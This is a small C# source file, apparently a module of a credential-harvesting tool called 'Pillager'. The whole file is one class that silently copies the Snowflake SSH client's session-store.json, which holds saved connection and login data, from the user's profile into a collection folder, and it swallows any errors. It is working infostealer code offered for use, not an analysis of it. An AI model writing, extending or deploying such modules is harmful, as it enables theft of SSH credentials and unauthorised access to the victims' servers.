using Pillager.Helper;
using System;
using System.IO;

namespace Pillager.FTPs
{
    internal class Snowflake : ICommand
    {
        public override void Save(string path)
        {
            try
            {
                string jsonpath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "snowflake-ssh\\session-store.json");
                if (File.Exists(jsonpath))
                {
                    string savepath = Path.Combine(path, "Snowflake");
                    Directory.CreateDirectory(savepath);
                    File.Copy(jsonpath, Path.Combine(savepath, "session-store.json"));
                }
            }
            catch { }
        }
    }
}
